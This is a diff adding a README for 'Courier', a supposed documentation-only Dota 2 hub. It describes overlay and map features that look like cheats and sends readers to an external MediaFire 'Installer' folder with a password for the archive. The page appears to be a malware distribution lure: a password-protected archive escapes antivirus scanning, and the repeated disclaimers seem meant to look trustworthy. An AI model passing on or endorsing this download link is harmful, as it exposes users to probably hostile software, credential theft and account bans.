@@ -1,0 +1,130 @@
+Courier
+
+  Delivery routes, item timing, and quality-of-life notes.
+
+  Independent Dota 2 community hub for setup notes, configuration hygiene, and interface concepts.
+
+Documentation-only community project. This repository is not affiliated
+with Valve or any third-party vendor. It does not contain a loader, DLL,
+executable, cheat source, game binaries, offsets, or license keys.
+The linked folder is an external distribution point; review it yourself.
+
+Courier is a community hub for Dota 2 notes that are usually scattered across
+short-lived posts: clean setup, configuration hygiene, display and hotkey
+choices, troubleshooting, and honest limitations. It is a documentation project,
+not a vendor storefront.
+
+Download
+
+Download folder: mediafire.com/folder/xpuwhpaw2jpbi/Installer
+Archive password: 5139237619
+
+The linked folder is the only distribution point referenced by this hub. Avoid
+reuploads, shortened URLs, and files sent through direct messages. If the folder
+is unavailable, open a documentation issue instead of trusting a mirror.
+
+At a glance
+
+| Item | Details |
+| --- | --- |
+| Project | Courier community hub for Dota 2 |
+| Repository scope | Documentation, previews, setup and configuration notes |
+| Target platform | Windows 10 or 11, x64 |
+| Target game | Dota 2 (Source 2) |
+| Distribution | External MediaFire folder linked above |
+| Support | Community documentation only |
+| Account risk | Third-party software can lead to a Valve or game ban |
+| Binaries | None: no DLL, EXE, loader, injector, or game offsets |
+
+Preview
+
+Interface concept: a compact match panel with cooldown, rune, and draft groups.
+
+Map concept: readable rune, ward, and objective timing without visual noise.
+
+Both images are original SVG concepts. They are not game captures, vendor
+screenshots, or evidence of current in-game behavior. See
+docs/previews.md for the full disclaimer.
+
+Feature areas
+
+The list below describes the vocabulary used in the documentation. It is not a
+feature guarantee, and this repository does not ship software that implements
+these ideas.
+
+| Area | What it covers |
+| --- | --- |
+| Hero overlay | Cooldown, status, and buyback concepts |
+| Rune control | Rune windows, rotation notes, and timing discipline |
+| Draft panel | Matchup context, role notes, and draft hygiene |
+| Vision map | Ward memory, threat radii, and map state |
+| Camera | Zoom, spectator-style framing, and HUD readability |
+| Scripts | Configuration and workflow notes, not executable code |
+| Configs | Profiles, backups, portability, and rollback |
+
+Quick start
+
+1. Read docs/installation.md before unpacking anything.
+2. Verify the archive and use the password shown above.
+3. Keep the package outside the Steam library and back up your configuration.
+4. Check docs/safety.md before using third-party software.
+5. Use docs/troubleshooting.md when the overlay,
+   display mode, or configuration does not behave as expected.
+
+This repository contains no executable and no loader. If a mirror asks you to
+disable antivirus, run an unsigned binary as administrator, or send account
+credentials, stop and verify the source.
+
+Configuration principles
+
+- Keep one profile per display setup and one backup before every update.
+- Prefer windowed borderless when an overlay is involved.
+- Record the exact game build, GPU driver, and overlay version in bug reports.
+- Never store Steam credentials, session tokens, or recovery codes in a config.
+- Treat public configs as untrusted input; inspect them before use.
+
+More detail: docs/configuration.md.
+
+Safety and limitations
+
+Third-party software can violate Valve's terms and lead to a VAC or game ban.
+This hub does not provide anti-cheat bypasses, hidden offsets, or a guarantee
+that any external package is safe or available. Use a separate account only if
+you understand and accept the risk. No warranty is provided.
+
+Read the full note: docs/safety.md.
+
+Repository layout
+
+assets/      banner, logo, download button, interface and map concepts
+docs/        installation, configuration, FAQ, troubleshooting, safety, previews
+.github/     issue templates and documentation validation workflow
+CHANGELOG.md
+CONTRIBUTING.md
+DISCLAIMER.md
+LICENSE
+NOTICE.md
+README.md
+ROADMAP.md
+SECURITY.md
+TOPICS.md
+repo-metadata.json
+spec.json
+
+There is deliberately no src/, bin/, build/, DLL, EXE, or game-offset
+directory in this repository.
+
+Documentation
+
+- Installation
+- Configuration
+- FAQ
+- Troubleshooting
+- Safety
+- Preview disclaimer
+- Updates
+
+License
+
+MIT. See LICENSE. The project is independent and unofficial.
+Dota 2 and Valve are trademarks of Valve Corporation. See NOTICE.md.
